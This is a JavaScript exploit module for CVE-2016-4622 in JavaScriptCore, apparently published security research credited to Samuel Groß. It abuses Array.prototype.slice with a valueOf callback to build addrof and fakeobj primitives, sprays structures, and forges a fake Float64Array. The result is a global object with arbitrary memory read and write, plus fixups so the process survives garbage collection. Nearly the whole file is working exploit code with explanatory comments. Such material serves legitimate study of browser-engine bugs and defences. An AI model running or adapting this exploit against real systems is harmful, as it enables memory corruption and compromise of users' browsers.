//
// Main exploit module. Exploits the bug and
// provides a 'memory' object which can be used
// to read and write arbitrary memory addresses.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js and int64.js
//

// Core exploit primitives.
// CVE-2016-4622 gives us two high level exploitation primitives: leaking of addresses
// of JavaScript objects and the ability to create our own fake JavaScript objects.

// Return the address of the given JavaScript object or string.
function addrof(object) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push(i + 0.1337);         // Array must be of type ArrayWithDoubles

    var b = a.slice(0, {valueOf: function() { a.length = 0; a = [object]; return 4; }});
    return Int64.fromDouble(b[3]);
}

// Return a JavaScript value that contains a JSObject pointer to the given address.
// This allows crafting of fake JavaScript objects in the VM.
function fakeobj(addr) {
    var a = []
    for (var i = 0; i < 100; i++)
        a.push({});             // Array must be of type ArrayWithContiguous

    addr = addr.asDouble();
    return a.slice(0, {valueOf: function() { a.length = 0; a = [addr]; return 4; }})[3];
}

// Check if the engine is vulnerable.
function isVulnerable() {
    return !isNaN(addrof({}).asDouble());
}

// Using the primitives above, this function sets up an arbitrary memory read/write primitive.
// It creates a global 'memory' object that can the be used to read from and write to arbitrary addresses.
function pwn() {
    var structs = [];
    function sprayStructures() {
        // The StructureIDTable can contain holes (these contain the index of the next free slot,
        // kind of like a freelist, just with indices). Since there could be a lot of free entries
        // in the table our spray must be somewhat large.
        function randomString() {
            return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
        }
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            // Add a new property to create a new Structure instance.
            a[randomString()] = 1337;
            structs.push(a);        // keep the Structure objects alive.
        }
    }

    // The plan is to
    // 0. Create a lot of Structures for Float64Array instances
    // 1. Setup a fake Float64Array inside another object's inline properties.
    //    The data pointer points into a Uint8Array.
    // 2. Since we don't know the correct structure ID of a Float64Array instance,
    //    we find it using 'instanceof'.
    // 3. We now have an arbitrary read+write primitive since we control the data pointer
    //    of an Uint8Array.
    // 4. We need to fix up a few things so the garbage collector won't crash the process.

    // Set up lot's of structures for Float64Array instances.
    sprayStructures();

    // Create the array that will be used to read and write arbitrary memory addresses.
    var hax = new Uint8Array(0x1000);

    // Create fake JSObject.
    print("[*] Setting up container object");

    var jsCellHeader = new Int64([
        00, 0x10, 00, 00,       // m_structureID, current guess.
                                // JSC allocats a set of structures for non-JSObjects (Executables, regular expression objects, ...)
                                // during start up. Avoid these by picking a high initial ID.
        0x0,                    // m_indexingType, None
        0x27,                   // m_type, Float64Array (doesn't really matter, will be different for older versions)
        0x18,                   // m_flags, OverridesGetOwnPropertySlot | InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1                     // m_cellState, NewWhite
    ]);

    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,       // Some arbitrary value, we'll fix this up at the end.
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

    // Create the fake Float64Array.
    var address = Add(addrof(container), 16);
    print("[*] Fake JSObject @ " + address);

    var fakearray = fakeobj(address);

    // From now on until we've set the butterfly pointer to a sane value (i.e. nullptr)
    // a GC run would crash the process. Thus, operations performed now should be
    // as fast as possible.

    // Find a StructureID for a Float64Array instance.
    while (!(fakearray instanceof Float64Array)) {
        // Try to avoid heap allocations here, we don't want to trigger GC.
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.asJSValue();
    }

    // Maybe shouldn't print stuff here.. :P
    print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

    //
    // We now have an arbitrary read+write primitive since we can overwrite the
    // data pointer of an Uint8Array with an arbitrary address.
    //
    // Optimization: force JIT compilation for these methods.
    //
    memory = {
        read: function(addr, length) {
            print("[<] Reading " + length + " bytes from " + addr);
            fakearray[2] = addr.asDouble();
            var a = new Array(length);
            for (var i = 0; i < length; i++)
                a[i] = hax[i];
            return a;
        },

        readInt64: function(addr) {
            return new Int64(this.read(addr, 8));
        },

        write: function(addr, data) {
            print("[>] Writing " + data.length + " bytes to " + addr);
            fakearray[2] = addr.asDouble();
            for (var i = 0; i < data.length; i++)
                hax[i] = data[i];
        },

        writeInt64: function(addr, val) {
            return this.write(addr, val.bytes());
        }
    };

    // Fixup the JSCell header of the container to make it look like an empty object.
    // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
    var empty = {};
    var header = memory.read(addrof(empty), 8);
    memory.write(addrof(container), header);

    // Copy the JSCell and Butterfly (will be nullptr) from an existing Float64Array.
    var f64array = new Float64Array(8);
    header = memory.read(addrof(f64array), 16);
    memory.write(addrof(fakearray), header);

    // Set valid flags as well: make it look like an OversizeTypedArray
    // for easy GC survival (see JSGenericTypedArrayView<Adaptor>::visitChildren).
    memory.write(Add(addrof(fakearray), 24), [0x10,0,0,0,1,0,0,0]);

    print("[+] All done!");

    // Root the container object so it isn't garbage collected.
    // This will allocate a butterfly for the fake object and store a reference to the container there.
    // The fake array itself is rooted by the memory object (closures).
    fakearray.container = container;
}
